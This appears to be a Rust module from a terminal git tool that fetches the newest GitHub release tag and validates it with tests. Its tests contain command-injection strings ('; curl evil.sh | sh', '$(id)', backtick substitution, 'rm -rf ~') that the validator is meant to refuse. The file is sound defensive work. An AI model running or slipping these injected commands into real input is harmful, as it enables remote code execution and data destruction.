//! Asking GitHub which release is newest. This is one of only two places in
//! the crate that touch the network (the other is `install::download`).

use std::time::Duration;

use anyhow::{Context, anyhow};

pub const REPO: &str = "bjo4/gitgraph-tui";

/// `/releases/latest` answers with a 302 to `/releases/tag/<tag>`, so one
/// header is all we need — no JSON to parse, and it does not spend the
/// anonymous `api.github.com` rate limit.
pub fn latest_url() -> String {
    format!("https://github.com/{REPO}/releases/latest")
}

pub fn release_page_url(tag: &str) -> String {
    format!("https://github.com/{REPO}/releases/tag/{tag}")
}

/// Pull the tag out of a redirect target such as
/// `https://github.com/bjo4/gitgraph-tui/releases/tag/v0.3.0`.
pub fn tag_from_location(location: &str) -> Option<String> {
    let (_, tag) = location.trim().rsplit_once("/releases/tag/")?;
    let tag = tag.split(['?', '#']).next()?.trim_end_matches('/');
    if tag.is_empty() || tag.contains('/') {
        return None;
    }
    if !is_valid_tag(tag) {
        return None;
    }
    Some(tag.to_string())
}

/// Release tags arrive from the network and one of them ends up inside a shell
/// command we ask the user to paste. Accept only what our own releases look
/// like; anything else is treated as "no release found" rather than sanitised,
/// because a tag we do not recognise is not one we could act on anyway.
pub fn is_valid_tag(tag: &str) -> bool {
    !tag.is_empty()
        && tag.len() <= 64
        && tag.starts_with(|c: char| c.is_ascii_alphanumeric())
        && tag
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '_' | '-'))
}

/// Fetch the newest release tag. Not unit-tested on purpose: it is the thin
/// network wrapper, and every decision it makes is delegated to
/// [`tag_from_location`], which is.
pub fn fetch_latest_tag(url: &str) -> anyhow::Result<String> {
    let agent: ureq::Agent = ureq::Agent::config_builder()
        .user_agent(concat!("gitgraph-tui/", env!("CARGO_PKG_VERSION")))
        .timeout_connect(Some(Duration::from_secs(3)))
        .timeout_global(Some(Duration::from_secs(5)))
        // Both calls are required. `max_redirects(0)` on its own returns an
        // Err, because `max_redirects_will_error` defaults to true; we want
        // the 3xx response itself so we can read its Location header.
        .max_redirects(0)
        .max_redirects_will_error(false)
        .https_only(true)
        .build()
        .into();
    let response = agent
        .get(url)
        .call()
        .with_context(|| format!("requesting {url}"))?;
    let status = response.status();
    let location = response
        .headers()
        .get("Location")
        .and_then(|value| value.to_str().ok())
        .ok_or_else(|| anyhow!("no Location header (status {status})"))?;
    tag_from_location(location).ok_or_else(|| anyhow!("unexpected redirect target: {location}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_tag_is_taken_from_the_redirect_target() {
        assert_eq!(
            tag_from_location("https://github.com/bjo4/gitgraph-tui/releases/tag/v0.3.0"),
            Some("v0.3.0".to_string())
        );
    }

    #[test]
    fn trailing_slashes_query_strings_and_fragments_are_stripped() {
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v1.2.3/"),
            Some("v1.2.3".to_string())
        );
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v1.2.3?x=1"),
            Some("v1.2.3".to_string())
        );
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v1.2.3#notes"),
            Some("v1.2.3".to_string())
        );
    }

    #[test]
    fn surrounding_whitespace_from_the_header_is_tolerated() {
        assert_eq!(
            tag_from_location("  https://github.com/o/r/releases/tag/v1.2.3  "),
            Some("v1.2.3".to_string())
        );
    }

    #[test]
    fn a_location_without_a_tag_segment_yields_nothing() {
        assert_eq!(tag_from_location("https://github.com/o/r/releases"), None);
        assert_eq!(tag_from_location("https://example.com/"), None);
        assert_eq!(tag_from_location(""), None);
    }

    #[test]
    fn an_empty_or_nested_tag_is_rejected() {
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/"),
            None
        );
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/a/b"),
            None
        );
    }

    #[test]
    fn a_tag_carrying_shell_metacharacters_is_refused() {
        // This tag reaches a `cargo install ... --tag {tag}` string that the
        // popup shows the user to paste into a shell, so the parser is the
        // place to stop it.
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v9.9.9+; curl evil.sh | sh"),
            None
        );
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v1.0.0`id`"),
            None
        );
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v1.0.0$(id)"),
            None
        );
        assert_eq!(
            tag_from_location("https://github.com/o/r/releases/tag/v1.0.0 rm -rf ~"),
            None
        );
    }

    #[test]
    fn the_urls_point_at_this_repository() {
        assert_eq!(
            latest_url(),
            "https://github.com/bjo4/gitgraph-tui/releases/latest"
        );
        assert_eq!(
            release_page_url("v0.3.0"),
            "https://github.com/bjo4/gitgraph-tui/releases/tag/v0.3.0"
        );
    }
}
